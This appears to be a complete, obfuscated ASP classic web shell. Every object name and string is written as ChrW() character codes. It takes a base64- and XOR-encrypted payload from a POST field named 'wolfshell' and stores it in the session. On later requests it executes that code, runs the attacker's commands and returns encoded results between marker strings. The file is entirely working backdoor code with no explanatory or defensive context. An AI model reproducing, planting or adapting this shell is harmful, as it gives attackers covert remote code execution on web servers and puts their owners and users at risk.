<%
Set d_glob_f3 = Server.CreateObject(ChrW(83)&ChrW(99)&ChrW(114)&ChrW(105)&ChrW(112)&ChrW(116)&ChrW(105)&ChrW(110)&ChrW(103)&ChrW(46)&ChrW(68)&ChrW(105)&ChrW(99)&ChrW(116)&ChrW(105)&ChrW(111)&ChrW(110)&ChrW(97)&ChrW(114)&ChrW(121))

Function f_b64d_1a(ByVal c_arg_1)
    Dim o_x_1, o_n_2
    Set o_x_1 = CreateObject(ChrW(77)&ChrW(115)&ChrW(120)&ChrW(109)&ChrW(108)&ChrW(50)&ChrW(46)&ChrW(68)&ChrW(79)&ChrW(77)&ChrW(68)&ChrW(111)&ChrW(99)&ChrW(117)&ChrW(109)&ChrW(101)&ChrW(110)&ChrW(116)&ChrW(46)&ChrW(51)&ChrW(46)&ChrW(48))
    Set o_n_2 = o_x_1.CreateElement(ChrW(98)&ChrW(97)&ChrW(115)&ChrW(101)&ChrW(54)&ChrW(52))
    o_n_2.dataType = ChrW(98)&ChrW(105)&ChrW(110)&ChrW(46)&ChrW(98)&ChrW(97)&ChrW(115)&ChrW(101)&ChrW(54)&ChrW(52)
    o_n_2.text = c_arg_1
    f_b64d_1a = o_n_2.nodeTypedValue
    Set o_n_2 = Nothing
    Set o_x_1 = Nothing
End Function

Function f_xdec_2b(c_arg_a, c_arg_b)
    Dim s_sz_1, i_ctr_2, res_3, k_sz_4, k_str_9a
    k_str_9a = ChrW(51)&ChrW(99)&ChrW(54)&ChrW(101)&ChrW(48)&ChrW(98)&ChrW(56)&ChrW(97)&ChrW(57)&ChrW(99)&ChrW(49)&ChrW(53)&ChrW(50)&ChrW(50)&ChrW(52)&ChrW(97)
    k_sz_4 = Len(k_str_9a)
    Set stm_11 = CreateObject(ChrW(65)&ChrW(68)&ChrW(79)&ChrW(68)&ChrW(66)&ChrW(46)&ChrW(83)&ChrW(116)&ChrW(114)&ChrW(101)&ChrW(97)&ChrW(109))
    stm_11.CharSet = ChrW(105)&ChrW(115)&ChrW(111)&ChrW(45)&ChrW(56)&ChrW(56)&ChrW(53)&ChrW(57)&ChrW(45)&ChrW(49)
    stm_11.Type = 2
    stm_11.Open
    If IsArray(c_arg_a) Then
        s_sz_1 = UBound(c_arg_a) + 1
        For i_ctr_2 = 1 To s_sz_1
            stm_11.WriteText ChrW(AscB(MidB(c_arg_a, i_ctr_2, 1)) Xor Asc(Mid(k_str_9a, (i_ctr_2 Mod k_sz_4) + 1, 1)))
        Next
    End If
    stm_11.Position = 0
    If c_arg_b Then
        stm_11.Type = 1
        f_xdec_2b = stm_11.Read()
    Else
        f_xdec_2b = stm_11.ReadText()
    End If
End Function

Dim p_name_a1, s_name_b2, c_dat_c8, r_dat_d9
p_name_a1 = ChrW(119)&ChrW(111)&ChrW(108)&ChrW(102)&ChrW(115)&ChrW(104)&ChrW(101)&ChrW(108)&ChrW(108)
s_name_b2 = ChrW(112)&ChrW(97)&ChrW(121)&ChrW(108)&ChrW(111)&ChrW(97)&ChrW(100)
c_dat_c8 = request.Form(p_name_a1)

If Not IsEmpty(c_dat_c8) Then
    If IsEmpty(Session(s_name_b2)) Then
        c_dat_c8 = f_xdec_2b(f_b64d_1a(c_dat_c8), False)
        Session(s_name_b2) = c_dat_c8
        response.End
    Else
        c_dat_c8 = f_xdec_2b(f_b64d_1a(c_dat_c8), True)
        d_glob_f3.Add s_name_b2, Session(s_name_b2)
        Execute(d_glob_f3(s_name_b2))
        r_dat_d9 = run(c_dat_c8)
        response.Write ChrW(97)&ChrW(55)&ChrW(49)&ChrW(97)&ChrW(98)&ChrW(49)
        If Not IsEmpty(r_dat_d9) Then
            response.Write Base64Encode(f_xdec_2b(r_dat_d9, True))
        End If
        response.Write ChrW(52)&ChrW(98)&ChrW(56)&ChrW(50)&ChrW(53)&ChrW(57)
    End If
End If
%>